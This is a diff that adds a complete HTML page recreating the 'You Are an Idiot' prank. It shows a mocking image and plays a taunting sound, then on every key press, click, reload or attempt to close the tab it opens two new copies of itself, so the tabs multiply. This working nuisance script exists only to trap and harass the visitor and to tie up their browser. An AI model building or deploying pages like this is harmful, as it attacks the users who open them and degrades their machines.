@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You Are an Idiot</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #111;
+            color: white;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        img {
+            max-width: 80%;
+            max-height: 80%;
+            border: 5px solid white;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://i.ebayimg.com/images/g/mYwAAOSwISVhfxz1/s-l1200.png" alt="You Are an Idiot" id="mainImage">
+
+    <!-- Add the "You Are an Idiot" audio -->
+    <audio id="trickSound" src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3"></audio>
+
+    <script>
+        const audio = document.getElementById('trickSound');
+
+        function playSoundAndOpenTabs() {
+            // Play the sound
+            audio.currentTime = 0; // Reset to the beginning
+            audio.play();
+
+            // Open two new tabs
+            const url = window.location.href;
+            for (let i = 0; i < 2; i++) {
+                window.open(url, '_blank');
+            }
+        }
+
+        // Detect any key press
+        document.addEventListener('keydown', playSoundAndOpenTabs);
+
+        // Detect tab closing or reload
+        window.onbeforeunload = function () {
+            playSoundAndOpenTabs();
+            return null; // Ensures the event is handled properly
+        };
+
+        // Detect clicking anywhere on the page
+        document.addEventListener('click', playSoundAndOpenTabs);
+    </script>
+</body>
+</html>
